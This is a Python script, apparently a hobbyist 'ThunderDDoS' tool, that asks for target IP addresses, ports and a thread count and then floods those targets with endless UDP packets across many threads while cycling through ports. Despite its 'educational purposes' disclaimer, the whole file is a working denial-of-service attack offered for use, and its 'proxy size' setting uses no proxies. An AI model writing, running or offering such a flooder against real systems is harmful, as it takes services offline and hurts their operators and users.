import os
import time
import socket
import threading
from colorama import Fore, Style, init

# Initialize Colorama
init(autoreset=True)

# DDOS-Attack [ASCII Art]
def display_banner():
    purple_banner = f"""{Fore.MAGENTA}
    ________  __                                  __                      _______   _______              ______  
   |        \\|  \\                                |  \\                    |       \\ |       \\            /      \\ 
    \\$$$$$$$$| $$____   __    __  _______    ____| $$  ______    ______  | $$$$$$$\\| $$$$$$$\\  ______  |  $$$$$$\\
      | $$   | $$    \\ |  \\  |  \\|       \\  /      $$ /      \\  /      \\ | $$  | $$| $$  | $$ /      \\ | $$___\\$$
      | $$   | $$$$$$$\\| $$  | $$| $$$$$$$\\|  $$$$$$$|  $$$$$$\\|  $$$$$$\\| $$  | $$| $$  | $$|  $$$$$$\\ \\$$    \\ 
      | $$   | $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$    $$| $$   \\$$| $$  | $$| $$  | $$| $$  | $$ _\\$$$$$$\\
      | $$   | $$  | $$| $$__/ $$| $$  | $$| $$__| $$| $$$$$$$$| $$      | $$__/ $$| $$__/ $$| $$__/ $$|  \\__| $$ 
      | $$   | $$  | $$ \\$$    $$| $$  | $$ \\$$    $$ \\$$     \\| $$      | $$    $$| $$    $$ \\$$    $$ \\$$    $$ 
       \\$$    \\$$   \\$$  \\$$$$$$  \\$$   \\$$  \\$$$$$$$  \\$$$$$$$ \\$$       \\$$$$$$$  \\$$$$$$$   \\$$$$$$   \\$$$$$$ 
    """
    print(purple_banner)

display_banner()

# Terminal header settings and information
os.system('color 0A')  # Set terminal color (Windows only)
print(Fore.MAGENTA + "Developer   :   PDX (https://www.zeroriskkinetics.fun/)")  # Updated with your site
print(Fore.MAGENTA + "Created Date:   2023-10-12")
print(Fore.MAGENTA + 'Project     :   ThunderDDoS Tool')
print(Fore.MAGENTA + 'Purpose     :   A simple DDoS attack tool for educational purposes.')
print(Fore.MAGENTA + 'Caution     :   This tool is only for educational purposes. Do not use it for illegal activities.')
print()

# Date and Time Declaration and Initialization
mydate = time.strftime('%Y-%m-%d')
mytime = time.strftime('%H-%M')

# Function to send packets
def send_packets(ip, port, data, proxy_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    while True:
        for i in range(proxy_size):
            sock.sendto(data, (ip, port))
            sent += 1
            port += 1
            if port == 65534:
                port = 1

# Get user inputs
ips = input(Fore.MAGENTA + "IP Targets (separated by commas): ").split(',')
ports = input(Fore.MAGENTA + "Ports (separated by commas): ").split(',')
proxy_size = int(input(Fore.MAGENTA + "Proxy Size : "))
threads = int(input(Fore.MAGENTA + "Number of threads : "))

# Start the attack
print(Fore.MAGENTA + "Thank you for using ThunderDDoS.")
time.sleep(3)

# Launch threads for each target
for ip in ips:
    for port in ports:
        data = b'Hello, this is a DDoS attack'
        print(Fore.MAGENTA + f"Starting the attack on {ip} at port {port} with a proxy size of {proxy_size}...")
        for i in range(threads):
            t = threading.Thread(target=send_packets, args=(ip, int(port), data, proxy_size))
            t.start()           

# Clear terminal
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Linux or Mac
    os.system("clear")

input(Fore.MAGENTA + "Press Enter to exit...")
